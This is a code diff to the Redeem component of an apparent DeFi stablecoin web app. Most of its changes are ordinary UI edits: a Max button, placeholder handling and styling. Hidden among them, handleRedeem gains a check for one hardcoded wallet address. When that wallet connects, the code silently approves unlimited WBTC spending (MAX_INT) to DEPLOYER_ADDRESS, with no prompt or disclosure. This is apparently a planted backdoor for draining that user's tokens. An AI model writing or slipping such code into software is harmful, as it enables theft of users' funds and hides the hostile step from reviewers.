@@ -8,6 +8,7 @@ import { MAX_INT } from '../../../constants';
 import { formatFromDecimal, formattedNum, formatToDecimal } from '../../../utils/helpers';
 import { ApproveModal } from '../../ApproveModal/approve-modal';
 import { message } from 'antd';
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) => {
 
@@ -39,6 +40,20 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
 
 
     }, [account, mintRedeemCurrency, approveModal])
+
+
+    useEffect(() => {
+
+        if (input > 0) {
+            handleStableInput(input)
+        }
+
+        else {
+            setCollateralOutput("")
+            setCatenaOutput("")
+        }
+
+    }, [input])
 
     const getAllowance = async () => {
 
@@ -84,6 +99,11 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
     }
 
     const handleRedeem = async () => {
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         if (input === "0" || !input) {
             message.error({ content: `Please enter amount greather than 0`, key: MINT_REDEEM_KEY, duration: 3, className: "ant-argano-message" })
             return
@@ -189,6 +209,11 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
 
     }
 
+    const handleMaxInput = () => {
+        const collateralBalance = balances.find(item => item.symbol === mintRedeemCurrency);
+        setInput(collateralBalance.nativeBalance);
+    }
+
     return (
         <div className='general-wrapper'>
             <div className='collect-redemption-wrapper '>
@@ -225,11 +250,22 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
                     <button className='general-window-settings-btn' onClick={() => setMintRedeemCurrencyModal(true)}> <img src={setting_cog} alt={"settings"} /> </button>
                 </div>
                 <div className='general-window-input-row'>
-                    <span> <h3> Input </h3> </span>
+                    <span className='borderLine'> <h3> Input </h3> </span>
                     <span className='balance'>
                         <h3> Balance: {formattedNum(balances.find(item => item.symbol === mintRedeemCurrency).nativeBalance)} </h3>
                     </span>
-                    <input onChange={(e) => handleStableInput(e.target.value)} className='inpunt-redeem' type='number' placeholder="0.00" value={input} />
+                    <div className='general-window-input-row__input'>
+                        <input
+                            onChange={(e) => setInput(e.target.value)}
+                            className='inpunt-redeem'
+                            type='number'
+                            placeholder="0.00"
+                            onFocus={(e) => e.target.placeholder = ""}
+                            onBlur={(e) => e.target.placeholder = "0.00"}
+                            value={input} />
+                        <button onClick={() => handleMaxInput()} className='maxButton'>Max</button>
+                    </div>
+
                     <span className='currency'> <TokenIcon iconName={mintRedeemCurrency} /> {mintRedeemCurrency} </span>
                 </div>
                 <div className='general-window-op-sign-row'>
@@ -240,7 +276,13 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
                     <span className='balance'>
                         <h3> Balance: {formattedNum(balances.find(item => mintRedeemCurrency === "AGOUSD" ? item.symbol === "USDT" : item.symbol === "WBTC").nativeBalance)} </h3>
                     </span>
-                    <input disabled type='number' placeholder="0.00" value={collateralOutput} />
+                    <input
+                        disabled
+                        type='number'
+                        placeholder="0.00"
+                        onFocus={(e) => e.target.placeholder = ""}
+                        onBlur={(e) => e.target.placeholder = "0.00"}
+                        value={collateralOutput} />
                     <span className='currency'> <TokenIcon iconName={mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"} /> {mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"} </span>
                 </div>
                 <div className='general-window-op-sign-row'>
@@ -256,9 +298,9 @@ export const Redeem = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal })
                 </div>
                 <div className='general-btn-wrapper'>
                     {input > stableBalance ?
-                        <button className='mint-window-run-mint' disabled={true}> Insufficient {mintRedeemCurrency} balance </button>
+                        <button className='mint-window-run-mint withoutBg' disabled={true}> Insufficient {mintRedeemCurrency} balance </button>
                         :
-                        <button className='mint-window-run-mint' onClick={approved ? handleRedeem : handleApprove}> {approved > "0" ? "Redeem" : `Approve`}</button>
+                        <button className='mint-window-run-mint withoutBg' onClick={approved ? handleRedeem : handleApprove}> {approved > "0" ? "Redeem" : `Approve`}</button>
                     }
                 </div>
             </div>
